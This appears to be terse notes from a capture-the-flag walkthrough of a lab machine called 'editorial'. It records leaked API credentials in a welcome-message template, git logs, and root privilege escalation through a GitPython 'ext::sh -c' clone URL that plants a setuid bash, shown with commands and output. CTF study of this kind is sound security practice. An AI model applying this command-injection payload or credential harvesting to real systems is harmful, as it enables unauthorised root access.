




```javascript
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
\



new_authors
```javascript
[
  {
    "1": {
      "api_route": "/api/v1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial El Tiempo Por Arriba"
    }
  },
  {
    "1.1": {
      "api_route": "/api/v1.1/metadata/",
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Ed Tiempo Arriba"
    }
  },
  {
    "1.2": {
      "contact_email_1": "soporte@tiempoarriba.oc",
      "contact_email_2": "info@tiempoarriba.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v1.2/metadata/"
    }
  },
  {
    "2": {
      "contact_email": "info@tiempoarriba.moc.oc",
      "editorial": "Editorial Tiempo Arriba",
      "endpoint": "/api/v2/metadata/"
    }
  }
]

```

message_authors
```javascript
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```


```
Username: devPassword: dev080217_devAPI!@
```




```
dev@editorial:~/apps/.git/logs$ cat HEAD
0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905723 -0500	commit (initial): feat: create editorial app
3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905870 -0500	commit: feat: create api to editorial info
1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500	commit: change(api): downgrading prod to dev
b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906471 -0500	commit: change: remove debug and update api port
dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906661 -0500	commit: fix: bugfix in api port endpoint
dev@editorial:~/apps/.git/logs$
```


```
'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
```


```
Username: prod 
Password: 080217_Producti0n_2023!@
```



```
prod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cp% /bin/bash% /tmp/bash% &&% chmod% u+s% /tmp/bash'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  Fil    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cp% /bin/bash% /tmp/bash% &&% chmod% u+s% /tmp/bash new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:/opt/internal_apps/clone_changes$ ls -la /tmp/
total 1408
drwxrwxrwt  8 root root    4096 Jun 18 15:46 .
drwxr-xr-x 18 root root    4096 Jun  5 14:54 ..
-rwsr-xr-x  1 root root 1396520 Jun 18 15:46 bash
-rw-rw-r--  1 prod prod      52 Jun 18 14:16 exploit.sh
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .font-unix
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .ICE-unix
drwxrwxr-x  2 dev  dev     4096 Jun 18 13:07 .lin
-rw-rw-r--  1 dev  dev     1919 Jun 18 13:07 passwd.bak
-rw-r--r--  1 root root       6 Jun 18 15:41 pwned
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .Test-unix
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .X11-unix
drwxrwxrwt  2 root root    4096 Jun 18 11:21 .XIM-unix
prod@editorial:/opt/internal_apps/clone_changes$ /tmp/bash -p
bash-5.1# id
uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
bash-5.1#
```



```
dev@editorial:/tmp$ cat root
404b94a72bed6bec07d516da706117d2

```


